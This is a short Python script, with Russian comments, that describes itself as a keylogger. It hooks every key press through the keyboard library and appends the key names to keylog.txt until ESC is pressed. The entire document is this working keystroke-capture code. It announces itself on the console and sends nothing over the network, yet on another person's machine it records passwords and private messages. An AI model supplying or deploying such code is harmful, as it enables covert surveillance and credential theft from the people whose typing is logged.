import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_key_press(event):
    """Функция, вызываемая при нажатии клавиши."""
    f = open(LOG_FILE, "a", encoding="utf-8")
    f.write(event.name)


if __name__ == "__main__":
  
    print("Кейлогер запущен. Нажмите ESC для остановки.")   
    keyboard.on_press(on_key_press)    
    keyboard.wait("esc")  # Остановка по ESC
    print("Кейлогер остановлен.")